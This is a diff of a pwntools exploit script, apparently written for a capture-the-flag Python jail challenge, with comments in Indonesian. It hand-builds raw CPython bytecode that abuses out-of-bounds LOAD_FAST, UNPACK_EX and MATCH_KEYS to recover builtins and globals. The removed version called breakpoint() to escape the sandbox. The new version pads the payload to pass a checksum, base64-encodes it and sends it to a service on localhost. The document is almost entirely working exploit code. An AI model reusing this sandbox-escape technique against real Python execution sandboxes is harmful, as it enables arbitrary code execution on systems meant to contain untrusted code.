@@ -26,76 +26,57 @@ BUILD_TUPLE = opmap['BUILD_TUPLE']
 DUMP_TO_STACK = b'!;^x'         # MATCH_KEYS -> UNPACK_EX (sekarang 120 values builtin ada di stack)
 CALL_NO_KW_BUILTIN_FAST = opmap['CALL_NO_KW_BUILTIN_FAST']
 STORE_SUBSCR = opmap['STORE_SUBSCR']
+LOAD_GLOBAL_BUILTIN = opmap['LOAD_GLOBAL_BUILTIN']
+COPY = opmap['COPY']
 context.log_level = 'critical'
 
+
+CNT = 43
+CNT2 = 20
 code = bytes([
-    ### Load builtins
-    LOAD_FAST, 60,
-    LOAD_FAST, 60,
-    UNPACK_EX, 61,
-    SWAP, 62,
-    *POP, 
-    BUILD_TUPLE, 61,
-    MATCH_KEYS, 61,
-    UNPACK_EX, 61,              # Now we have builtin functions on the stack
-
-    *((LOAD_FAST, 36)*30),      # LOAD_FAST spray to get more shit
-    SWAP, 100,                  # globals dict 
-    STORE_FAST, 32,
-    
-    # Load builtins again to fill in globals dict
-    LOAD_FAST, 125,
-    UNPACK_EX, 32,
-    
-    # Fill in globals dict with random values using STORE_SUBSCR
-    *((
-        STORE_FAST, 55,
-        STORE_FAST, 56,
-        LOAD_FAST, 55,
-        LOAD_FAST, 32,
-        LOAD_FAST, 56,
-        STORE_SUBSCR, 42,
-        33,33,                  # cache 
-    )*23),
-
-    ### Globals and builtins shenanigans
-    SWAP, 59,                   # eval
-    LOAD_FAST, 32,  
-    LOAD_FAST, 32,
-    UNPACK_EX, 32,
-    SWAP, 33,
+    # Recover builtins
+    COPY, 5,
+    COPY, 6,
+    UNPACK_EX, CNT,
+    SWAP, CNT+1,
     *POP,
-    BUILD_TUPLE, 32,
-    MATCH_KEYS, 32,
-    UNPACK_EX, 32,
-    *(POP*20), 
-    STORE_FAST, 59,             # payload
-    *(POP),
-    STORE_FAST, 33,             # gadget
-    *(POP*12),
-    STORE_FAST, 34,
-
-    ### Execute breakpoint()
-    LOAD_FAST, 33,
-    LOAD_FAST, 34,
-    LOAD_FAST, 59,
-    *((LAE,32)*31),
-    CALL_NO_KW_BUILTIN_FAST, 32,
-    32,32,32,32,32,32,          # Needs 3 caches for some reason
-
-    RETURN_VALUE, 32,
+    BUILD_TUPLE, CNT,
+    MATCH_KEYS, CNT,
+    UNPACK_EX, 2,
+    SWAP, 2,                          # print function
+    # Recover globals
+    COPY, 11,
+    COPY, 12,
+    UNPACK_EX, CNT2,
+    SWAP, CNT2+1,
+    *POP,
+    BUILD_TUPLE, CNT2,
+    MATCH_KEYS, CNT2,
+    UNPACK_EX, 2,
+    SWAP, 2,
+    COPY, 2,
+    COPY, 7,                        # print()
+    COPY, 3,                        # code
+    CALL_NO_KW_BUILTIN_FAST, 0,     # print(code)
+    2,2,2,2,2,9,                    # cache and also to make it divisible by 17
+    RETURN_VALUE, 0,
 ])
 
 
-payload = open('payload', 'w')
-payload.write(code.decode())
-payload.close()
-p = remote('localhost', 1225)
-p.sendlineafter(b'ka?', b'breakpoint()#' + ''.join(set(code.decode())).encode())
-print(b'breakpoint()#' + ''.join(set(code.decode())).encode())
-p.sendline(code)
 
 
+print([x for x in code])
+print(len(code))
+print(sum([x for x in code]) % 17)
+
+from base64 import b64encode
+
+p = remote("localhost", 1225)
+b64code = b64encode(code)
+
+# payload = open('payload', 'w')
+# payload.write(b64code.decode())
+# payload.close()
+
+p.sendline(b64code)
 p.interactive()
-res = p.recvall(timeout=0.1).decode()
-print(res)
